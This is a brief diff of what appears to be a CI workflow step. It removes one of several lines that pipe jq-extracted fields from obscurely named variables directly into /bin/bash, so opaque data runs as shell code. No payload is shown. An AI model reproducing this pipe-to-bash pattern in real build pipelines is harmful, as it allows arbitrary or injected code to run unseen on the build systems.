@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$wr3243" | jq -r .j73 | /bin/bash
           printf '%s' "$p40931" | jq -r .arnyh7414 | /bin/bash
           printf '%s' "$eyodz2261" | jq -r .tzt77 | /bin/bash
-          echo $tyz993 | jq -r .hoia9 | /bin/bash
           echo $ppjan6 | jq -r .qc66409 | /bin/bash
 
       - name: Persist output
